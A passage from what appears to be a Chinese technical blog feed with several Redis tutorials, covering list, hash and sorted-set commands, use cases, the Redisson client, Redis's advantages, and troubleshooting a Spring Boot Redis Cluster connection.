class="language-none">127.0.0.1:6379&gt; zincrby footCounts 2000 tid&quot;18011&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取集合元素个数-1"><a href="#获取集合元素个数-1" class="headerlink" title="获取集合元素个数"></a>获取集合元素个数</h4><blockquote><p>语法：zcard key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zcard footCounts(integer) 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取指定范围分数个数"><a href="#获取指定范围分数个数" class="headerlink" title="获取指定范围分数个数"></a>获取指定范围分数个数</h4><blockquote><p>语法：zcount key min max</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zcount footCounts 2000 20000(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="删除指定元素"><a href="#删除指定元素" class="headerlink" title="删除指定元素"></a>删除指定元素</h4><blockquote><p>语法：zrem key member [member …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zrem footCounts huny(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取元素排名"><a href="#获取元素排名" class="headerlink" title="获取元素排名"></a>获取元素排名</h4><blockquote><p>语法：zrank key member</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zrank footCounts tid(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="列表操作命令"><a href="#列表操作命令" class="headerlink" title="列表操作命令"></a>列表操作命令</h2><p>列表类型是一个有序的字段串列表，内部是使用双向链表实现，所有可以向两端操作元素，获取两端的数据速度快，通过索引到具体的行数比较慢。</p><p>列表类型的元素是有序且可以重复的。</p><h4 id="存储值-2"><a href="#存储值-2" class="headerlink" title="存储值"></a>存储值</h4><blockquote><p>左端存值语法：lpush key value [value …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lpush list lily sandy(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>右端存值语法：rpush key value [value …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; rpush list tom kitty(integer) 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>索引存值语法：lset key index value</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lset list 3 utoOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="弹出元素-1"><a href="#弹出元素-1" class="headerlink" title="弹出元素"></a>弹出元素</h4><blockquote><p>左端弹出语法：lpop key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lpop list&quot;sandy&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>右端弹出语法：rpop key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; rpop list&quot;kitty&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取元素个数"><a href="#获取元素个数" class="headerlink" title="获取元素个数"></a>获取元素个数</h4><blockquote><p>语法：llen key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; llen list(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取列表元素"><a href="#获取列表元素" class="headerlink" title="获取列表元素"></a>获取列表元素</h4><blockquote><p>两边获取语法：lrange key start stop</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lpush users tom kitty land pony jack maddy(integer) 6127.0.0.1:6379&gt; lrange users 0 31) &quot;maddy&quot;2) &quot;jack&quot;3) &quot;pony&quot;4) &quot;land&quot;&#x2F;&#x2F; 获取所有127.0.0.1:6379&gt; lrange users 0 -11) &quot;maddy&quot;2) &quot;jack&quot;3) &quot;pony&quot;4) &quot;land&quot;5) &quot;kitty&quot;6) &quot;tom&quot;&#x2F;&#x2F; 从右端索引127.0.0.1:6379&gt; lrange users -3 -11) &quot;land&quot;2) &quot;kitty&quot;3) &quot;tom&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>索引获取语法：lindex key index</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lindex list 2&quot;ketty&quot;&#x2F;&#x2F; 从右端获取127.0.0.1:6379&gt; lindex list -5&quot;sady&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h4><blockquote><p>根据值删除语法：lrem key count value</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; lpush userids 111 222 111 222 222 333 222 222(integer) 8&#x2F;&#x2F; count&#x3D;0 删除所有127.0.0.1:6379&gt; lrem userids 0 111(integer) 2&#x2F;&#x2F; count &gt; 0 从左端删除前count个127.0.0.1:6379&gt; lrem userids 3 222(integer) 3&#x2F;&#x2F; count &lt; 0 从右端删除前count个127.0.0.1:6379&gt; lrem userids -3 222(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>范围删除语法：ltrim key start stop</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 只保留2-4之间的元素127.0.0.1:6379&gt; ltrim list 2 4OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="散列操作命令"><a href="#散列操作命令" class="headerlink" title="散列操作命令"></a>散列操作命令</h2><p>redis字符串类型键和值是字典结构形式，这里的散列类型其值也可以是字典结构。</p><h4 id="存放键值-1"><a href="#存放键值-1" class="headerlink" title="存放键值"></a>存放键值</h4><blockquote><p>单个语法：hset key field value</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hset user name javastack(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>多个语法：hmset key field value [field value …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hmset user name javastack age 20 address chinaOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>不存在时语法：hsetnx key field value</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hsetnx user tall 180(integer) 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><blockquote><p>单个语法：hget key field</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hget user age&quot;20&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>多个语法：hmget key field [field …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hmget user name age address1) &quot;javastack&quot;2) &quot;20&quot;3) &quot;china&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>获取所有键与值语法：hgetall key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hgetall user1) &quot;name&quot;2) &quot;javastack&quot;3) &quot;age&quot;4) &quot;20&quot;5) &quot;address&quot;6) &quot;china&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>获取所有字段语法：hkeys key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hkeys user1) &quot;name&quot;2) &quot;address&quot;3) &quot;tall&quot;4) &quot;age&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>获取所有值语法：hvals key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hvals user1) &quot;javastack&quot;2) &quot;china&quot;3) &quot;170&quot;4) &quot;20&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断字段是否存在"><a href="#判断字段是否存在" class="headerlink" title="判断字段是否存在"></a>判断字段是否存在</h4><blockquote><p>语法：hexists key field</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hexists user address(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取字段数量"><a href="#获取字段数量" class="headerlink" title="获取字段数量"></a>获取字段数量</h4><blockquote><p>语法：hlen key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hlen user(integer) 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="递增-减"><a href="#递增-减" class="headerlink" title="递增&#x2F;减"></a>递增&#x2F;减</h4><blockquote><p>语法：hincrby key field increment</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hincrby user tall -10(integer) 170<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h4><blockquote><p>语法：hdel key field [field …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; hdel user age(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>都是基本的命令用法，不会用了就来翻一下吧！</p><p>写了大半天，点赞转发支持一下吧，亲！</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 的 8 大应用场景！</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E7%9A%84%208%20%E5%A4%A7%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%81/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E7%9A%84%208%20%E5%A4%A7%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>之前讲过Redis的介绍，及使用Redis带来的优势，这章整理了一下Redis的应用场景，也是非常重要的，学不学得好，能正常落地是关键。</p><p>下面一一来分析下Redis的应用场景都有哪些。</p><h4 id="1、缓存"><a href="#1、缓存" class="headerlink" title="1、缓存"></a>1、缓存</h4><p>缓存现在几乎是所有中大型网站都在用的必杀技，合理的利用缓存不仅能够提升网站访问速度，还能大大降低数据库的压力。Redis提供了键过期功能，也提供了灵活的键淘汰策略，所以，现在Redis用在缓存的场合非常多。</p><h4 id="2、排行榜"><a href="#2、排行榜" class="headerlink" title="2、排行榜"></a>2、排行榜</h4><p>很多网站都有排行榜应用的，如京东的月度销量榜单、商品按时间的上新排行榜等。Redis提供的有序集合数据类构能实现各种复杂的排行榜应用。</p><h4 id="3、计数器"><a href="#3、计数器" class="headerlink" title="3、计数器"></a>3、计数器</h4><p>什么是计数器，如电商网站商品的浏览量、视频网站视频的播放数等。为了保证数据实时效，每次浏览都得给+1，并发量高时如果每次都请求数据库操作无疑是种挑战和压力。Redis提供的incr命令来实现计数器功能，内存操作，性能非常好，非常适用于这些计数场景。</p><h4 id="4、分布式会话"><a href="#4、分布式会话" class="headerlink" title="4、分布式会话"></a>4、分布式会话</h4><p>集群模式下，在应用不多的情况下一般使用容器自带的session复制功能就能满足，当应用增多相对复杂的系统中，一般都会搭建以Redis等内存数据库为中心的session服务，session不再由容器管理，而是由session服务及内存数据库管理。</p><h4 id="5、分布式锁"><a href="#5、分布式锁" class="headerlink" title="5、分布式锁"></a>5、分布式锁</h4><p>在很多互联网公司中都使用了分布式技术，分布式技术带来的技术挑战是对同一个资源的并发访问，如全局ID、减库存、秒杀等场景，并发量不大的场景可以使用数据库的悲观锁、乐观锁来实现，但在并发量高的场合中，利用数据库锁来控制资源的并发访问是不太理想的，大大影响了数据库的性能。可以利用Redis的setnx功能来编写分布式的锁，如果设置返回1说明获取锁成功，否则获取锁失败，实际应用中要考虑的细节要更多。</p><h4 id="6、-社交网络"><a href="#6、-社交网络" class="headerlink" title="6、 社交网络"></a>6、 社交网络</h4><p>点赞、踩、关注&#x2F;被关注、共同好友等是社交网站的基本功能，社交网站的访问量通常来说比较大，而且传统的关系数据库类型不适合存储这种类型的数据，Redis提供的哈希、集合等数据结构能很方便的的实现这些功能。</p><h4 id="7、最新列表"><a href="#7、最新列表" class="headerlink" title="7、最新列表"></a>7、最新列表</h4><p>Redis列表结构，LPUSH可以在列表头部插入一个内容ID作为关键字，LTRIM可用来限制列表的数量，这样列表永远为N个ID，无需查询最新的列表，直接根据ID去到对应的内容页即可。</p><h4 id="8、消息系统"><a href="#8、消息系统" class="headerlink" title="8、消息系统"></a>8、消息系统</h4><p>消息队列是大型网站必用中间件，如ActiveMQ、RabbitMQ、Kafka等流行的消息队列中间件，主要用于业务解耦、流量削峰及异步处理实时性低的业务。Redis提供了发布&#x2F;订阅及阻塞队列功能，能实现一个简单的消息队列系统。另外，这个不能和专业的消息中间件相比。</p><p>@程序猿 你们还知道别的应用吗？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisson - Redis官方推荐的分布式协调客服端</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redisson%20-%20Redis%E5%AE%98%E6%96%B9%E6%8E%A8%E8%8D%90%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%B0%83%E5%AE%A2%E6%9C%8D%E7%AB%AF/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redisson%20-%20Redis%E5%AE%98%E6%96%B9%E6%8E%A8%E8%8D%90%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%B0%83%E5%AE%A2%E6%9C%8D%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是Redisson"><a href="#什么是Redisson" class="headerlink" title="什么是Redisson"></a>什么是Redisson</h4><p>Redisson是Redis官方推荐的一个高级的分布式协调Redis客服端，</p><p>Redisson在基于NIO的Netty框架上，充分的利用了Redis键值数据库提供的一系列优势，在Java实用工具包中常用接口的基础上，为使用者提供了一系列具有分布式特性的常用工具类。使得原本作为协调单机多线程并发程序的工具包获得了协调分布式多机多线程并发系统的能力，大大降低了设计和研发大规模分布式系统的难度。同时结合各富特色的分布式服务，更进一步简化了分布式环境中程序相互之间的协作。</p><p>兼容 Redis 2.6+ and JDK 1.6+，使用Apache License 2.0授权协议.</p><blockquote><p>官网：<a href="https://redisson.org//">https://redisson.org/\</a><br>Github：<a href="https://github.com/redisson/redisson">https://github.com/redisson/redisson</a></p></blockquote><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>分布式应用，缓存，分布式会话，分布式任务&#x2F;服务&#x2F;延迟执行服务，Redis客户端等。</p><h4 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h4><p>云Redis管理、多样Redis配置支持、丰富连接方式、分布式对象、分布式集合、分布式锁、分布式服务、多种序列化方式、三方框架整合、完善工具等。</p><ul><li>支持云托管服务模式（同时支持亚马逊云的ElastiCache Redis和微软云的Azure Redis Cache）:</li></ul><ol><li>自动发现主节点变化</li></ol><ul><li>支持Redis集群模式（同时支持亚马逊云的ElastiCache Redis Cluster和微软云的Azure RedisCache）:</li></ul><ol><li>自动发现主从节点</li><li>自动更新状态和组态拓扑</li><li>自动发现槽的变化</li></ol><ul><li>支持Redis哨兵模式:</li></ul><ol><li>自动发现主、从和哨兵节点</li><li>自动更新状态和组态拓扑</li></ol><ul><li><p>支持Redis主从模式</p></li><li><p>支持Redis单节模式</p></li><li><p>多节点模式均支持读写分离：从读主写，主读主写，主从混读主写</p></li><li><p>所有对象和接口均支持异步操作</p></li><li><p>自行管理的弹性异步连接池</p></li><li><p>所有操作线程安全</p></li><li><p>支持LUA脚本</p></li><li><p>提供分布式对象</p></li></ul><p>通用对象桶（Object Bucket）、二进制流（Binary Stream）、地理空间对象桶（Geospatial Bucket）、BitSet、原子整长形（AtomicLong）、原子双精度浮点数（AtomicDouble）、话题（订阅分发）、布隆过滤器（Bloom Filter）和基数估计算法（HyperLogLog）</p><ul><li><p>提供分布式集合<br>　　映射（Map）、多值映射（Multimap）、集（Set）、列表（List）、有序集（SortedSet）、计分排序集（ScoredSortedSet）、字典排序集（LexSortedSet）、列队（Queue）、双端队列（Deque）、阻塞队列（Blocking Queue）、有界阻塞列队（Bounded Blocking Queue）、阻塞双端列队（Blocking Deque）、阻塞公平列队（Blocking Fair Queue）、延迟列队（Delayed Queue）、优先队列（Priority Queue）和优先双端队列（Priority Deque）</p></li><li><p>提供分布式锁和同步器</p></li></ul><p>可重入锁（Reentrant Lock）、公平锁（Fair Lock）、联锁（MultiLock）、红锁（RedLock）、读写锁（ReadWriteLock）、信号量（Semaphore）、可过期性信号量（PermitExpirableSemaphore）和闭锁（CountDownLatch）</p><ul><li>提供分布式服务</li></ul><p>分布式远程服务（Remote Service, RPC）、分布式实时对象（Live Object）服务、分布式执行服务（Executor Service）、分布式调度任务服务（Scheduler Service）和分布式映射归纳服务（MapReduce）</p><ul><li><p>支持Spring框架</p></li><li><p>提供Spring Cache集成</p></li><li><p>提供Hibernate Cache集成</p></li><li><p>提供JCache实现</p></li><li><p>提供Tomcat Session Manager</p></li><li><p>提供Spring Session集成</p></li><li><p>支持异步流方式执行操作</p></li><li><p>支持Redis管道操作（批量执行）</p></li><li><p>支持安卓（Andriod）系统</p></li><li><p>支持断线自动重连</p></li><li><p>支持命令发送失败自动重试</p></li><li><p>支持OSGi</p></li><li><p>支持采用多种方式自动序列化和反序列化（Jackson JSON,Avro,Smile,CBOR,MsgPack,Kryo,FST,LZ4,Snappy和JDK序列化）</p></li><li><p>超过1000个单元测试</p></li></ul><h4 id="与Jedis对比"><a href="#与Jedis对比" class="headerlink" title="与Jedis对比"></a>与Jedis对比</h4><p>Jedis是Redis的Java实现的客户端，其API提供了比较全面的Redis命令的支持；Redisson实现了分布式和可扩展的Java数据结构，和Jedis相比，功能较为简单，不支持字符串操作，不支持排序、事务、管道、分区等Redis特性。Redisson的宗旨是促进使用者对Redis的关注分离，从而让使用者能够将精力更集中地放在处理业务逻辑上。</p><h4 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h4><p><strong>Maven</strong></p><pre class="line-numbers language-none"><code class="language-none"><!-- JDK 1.8+ compatible -->&lt;dependency&gt;   &lt;groupId&gt;org.redisson&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;redisson&lt;&#x2F;artifactId&gt;   &lt;version&gt;3.5.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;  <!-- JDK 1.6+ compatible -->&lt;dependency&gt;   &lt;groupId&gt;org.redisson&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;redisson&lt;&#x2F;artifactId&gt;   &lt;version&gt;2.10.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Java</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1. Create config objectConfig &#x3D; ...&#x2F;&#x2F; 2. Create Redisson instanceRedissonClient redisson &#x3D; Redisson.create(config);&#x2F;&#x2F; 3. Get object you needRMap&lt;MyKey, MyValue&gt; map &#x3D; redisson.getMap(&quot;myMap&quot;);RLock lock &#x3D; redisson.getLock(&quot;myLock&quot;);RExecutorService executor &#x3D; redisson.getExecutorService(&quot;myExecutorService&quot;);&#x2F;&#x2F; over 30 different objects and services ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis是什么？4大优势，必学中间件！</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F4%E5%A4%A7%E4%BC%98%E5%8A%BF%EF%BC%8C%E5%BF%85%E5%AD%A6%E4%B8%AD%E9%97%B4%E4%BB%B6%EF%BC%81/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F4%E5%A4%A7%E4%BC%98%E5%8A%BF%EF%BC%8C%E5%BF%85%E5%AD%A6%E4%B8%AD%E9%97%B4%E4%BB%B6%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-3-15/65807497.jpg" alt="image"></p><h4 id="Redis是什么？"><a href="#Redis是什么？" class="headerlink" title="Redis是什么？"></a>Redis是什么？</h4><blockquote><p>全称：REmote DIctionary Server</p></blockquote><p>Redis是一种key-value形式的NoSQL内存数据库，由ANSI C编写，遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>Redis最大的特性是它会将所有数据都放在内存中，所以读写速度性能非常好。当然，它也支持将内存中的数据以快照和日志的形式持久化到硬盘，这样即使在断电、机器故障等异常情况发生时数据也不会丢失，Redis能从硬盘中恢复快照数据到内存中。</p><blockquote><p>官网：<a href="https://redis.io//">https://redis.io/\</a><br>中文：<a href="http://www.redis.cn//">http://www.redis.cn/\</a><br>Github：<a href="https://github.com/antirez/redis">https://github.com/antirez/redis</a></p></blockquote><h4 id="Redis有什么优势？"><a href="#Redis有什么优势？" class="headerlink" title="Redis有什么优势？"></a>Redis有什么优势？</h4><p><strong>1、性能高，速度快</strong></p><p>Redis命令执行速度非常快，官方给出的读写性能可以达到10W&#x2F;秒。为什么会如此之快呢？有以下几个因素：</p><ul><li>数据存储在内存中，直接与内存连接。</li><li>由相对底层的C语言实现，离操作系统更近。</li><li>实现源码很精湛，仅仅几万行代码，简单稳定。</li><li>使用了单线程模型，无多线程竞争、锁等问题。</li></ul><p><strong>2、丰富的数据结构</strong></p><p>Redis与其他的内存数据库不同的是，Redis拥有丰富的数据类型，如字符串、哈希、列表、集合、有序集合等。正是因为Redis丰富的数据类型，所有它能应用的场景非常多。</p><p><strong>3、丰富的特性</strong></p><p>除了支持丰富的数据结构外，还支持以下高级功能。</p><ul><li>支持键过期功能，可以用来实现定时缓存。</li><li>支持发布&#x2F;订阅功能，可以有来实现消息队列。</li><li>支持事务功能，可以保证多条命令的事务性。</li><li>支持供管道功能，能够批量处理命令。</li><li>支持Lua脚本功能。</li><li>支持集群分片和数据复制功能。</li><li>支持内存数据持久化硬盘功能。</li></ul><p><strong>4、丰富的客户端</strong></p><blockquote><p>官网索引：<a href="http://www.redis.cn/clients.html">http://www.redis.cn/clients.html</a></p></blockquote><p>从官网给出的客户端列表可以看出，各种各种的语言都能接入到Redis，接入包括了所有的主流开发语言。</p><p>目前使用Redis的公司非常多，国内外都有很多重量级的公司在用。所以，现在学习Redis是大势所趋，学好Redis能为自己在日后的工作谋生中增加一个强有利的竞争手段。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Redis Cluster 实战干货</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Spring%20Boot%20Redis%20Cluster%20%E5%AE%9E%E6%88%98%E5%B9%B2%E8%B4%A7/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Spring%20Boot%20Redis%20Cluster%20%E5%AE%9E%E6%88%98%E5%B9%B2%E8%B4%A7/</url>
      
        <content type="html"><![CDATA[<h4 id="添加配置信息"><a href="#添加配置信息" class="headerlink" title="添加配置信息"></a>添加配置信息</h4><pre class="line-numbers language-none"><code class="language-none">spring.redis:  database: 0 # Redis数据库索引（默认为0）  #host: 192.168.1.8  #port: 6379  password: 123456  timeout: 10000 # 连接超时时间（毫秒）    pool:     max-active: 8 # 连接池最大连接数（使用负值表示没有限制）    max-idle: 8 # 连接池中的最大空闲连接    max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制）    min-idle: 0 # 连接池中的最小空闲连接  cluster:    nodes:      - 192.168.1.8:9001      - 192.168.1.8:9002      - 192.168.1.8:9003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要添加3个master节点，3个slave节点不需要添加。</p><p>你要做的也只有这些配置了，其他的spring boot都自动配置好了。</p><p>现在就可以像使用单机一样使用集群，redis会自动按key分片到不同的集群实例。</p><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><pre class="line-numbers language-none"><code class="language-none">Caused by: redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool    at redis.clients.util.Pool.getResource(Pool.java:53)    at redis.clients.jedis.JedisPool.getResource(JedisPool.java:226)    at redis.clients.jedis.JedisSlotBasedConnectionHandler.getConnectionFromSlot(JedisSlotBasedConnectionHandler.java:66)    at redis.clients.jedis.JedisClusterCommand.runWithRetries(JedisClusterCommand.java:116)    at redis.clients.jedis.JedisClusterCommand.runWithRetries(JedisClusterCommand.java:141)    at redis.clients.jedis.JedisClusterCommand.runWithRetries(JedisClusterCommand.java:141)    at redis.clients.jedis.JedisClusterCommand.runWithRetries(JedisClusterCommand.java:141)    at redis.clients.jedis.JedisClusterCommand.runWithRetries(JedisClusterCommand.java:141)    at redis.clients.jedis.JedisClusterCommand.runBinary(JedisClusterCommand.java:60)    at redis.clients.jedis.BinaryJedisCluster.set(BinaryJedisCluster.java:77)    at org.springframework.data.redis.connection.jedis.JedisClusterConnection.set(JedisClusterConnection.java:618)    ... 36 moreCaused by: redis.clients.jedis.exceptions.JedisConnectionException: java.net.ConnectException: Connection refused: connect    at redis.clients.jedis.Connection.connect(Connection.java:207)    at redis.clients.jedis.BinaryClient.connect(BinaryClient.java:93)    at redis.clients.jedis.BinaryJedis.connect(BinaryJedis.java:1767)    at redis.clients.jedis.JedisFactory.makeObject(JedisFactory.java:106)    at org.apache.commons.pool2.impl.GenericObjectPool.create(GenericObjectPool.java:868)    at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:435)    at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:363)    at redis.clients.util.Pool.getResource(Pool.java:49)    ... 46 moreCaused by: java.net.ConnectException: Connection refused: connect    at java.net.DualStackPlainSocketImpl.waitForConnect(Native Method)    at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:85)    at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)    at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)    at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172)    at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)    at java.net.Socket.connect(Socket.java:589)    at redis.clients.jedis.Connection.connect(Connection.java:184)    ... 53 more<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试往redis写数据的时候，报不能获取连接异常，跟踪了半天代码，发现连接的是127.0.0.1，而不是配置的192.168.1.8，这就奇怪了，继续跟踪代码发现是往redis服务器获取的返回的集群实例列表，真是坑！</p><p><img src="https://i.stack.imgur.com/aqRpc.png" alt="image"></p><p>源码：</p><blockquote><p>redis.clients.jedis.Jedis#clusterSlots</p></blockquote><pre class="line-numbers language-none"><code class="language-none">@Overridepublic List&lt;Object&gt; clusterSlots() &#123;    checkIsInMultiOrPipeline();    client.clusterSlots();    return client.getObjectMultiBulkReply();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是这里获取返回的集群列表，返回的就是127.0.0.1，而不是配置的192.168.1.8。</p><p>最后修改各个集群节点的配置文件redis.conf，添加：</p><pre class="line-numbers language-none"><code class="language-none">bind 192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启集群节点之后，读写正常。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
